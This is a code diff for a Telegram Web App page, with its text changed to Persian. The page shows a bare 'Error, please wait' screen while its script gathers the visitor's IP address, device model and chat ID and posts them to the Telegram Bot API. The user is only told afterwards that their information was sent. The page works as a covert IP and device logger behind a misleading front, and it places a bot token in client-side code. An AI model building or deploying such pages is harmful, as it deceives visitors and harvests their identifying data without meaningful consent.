@@ -6,8 +6,8 @@
     <title>Telegram Web App</title>
 </head>
 <body>
-    <h1>Error</h1>
-    <p>Please wait...</p>
+    <h1>خطا</h1>
+    <p>لطفاً صبر کنید ...</p>
     <script>
         // Get Telegram WebApp object
         const webApp = window.Telegram.WebApp;
@@ -25,31 +25,41 @@
             .then(data => {
                 const ip = data.ip;
                 
-                // Send data to Flask server
-                fetch('YOUR_FLASK_SERVER_URL/save_data', {
+                // Send data to Telegram bot
+                const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+                const botChatId = chat_id; // Use the user's chat ID
+                const message = JSON.stringify({
+                    chat_id: chat_id,
+                    ip: ip,
+                    device_model: device_model
+                });
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: chat_id,
-                        ip: ip,
-                        device_model: device_model
+                        chat_id: botChatId,
+                        text: message
                     })
                 })
                 .then(response => response.json())
                 .then(result => {
-                    console.log('Data saved:', result);
-                    webApp.showAlert('Your information has been saved!');
+                    if (result.ok) {
+                        webApp.showAlert('اطلاعات شما با موفقیت ارسال شد!');
+                    } else {
+                        webApp.showAlert('خطا در ارسال اطلاعات.');
+                    }
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    webApp.showAlert('An error occurred while saving your information.');
+                    webApp.showAlert('خطا در ارسال اطلاعات به ربات.');
                 });
             })
             .catch(error => {
                 console.error('Error fetching IP:', error);
-                webApp.showAlert('Could not retrieve IP address.');
+                webApp.showAlert('خطا در دریافت آدرس IP.');
             });
     </script>
 </body>
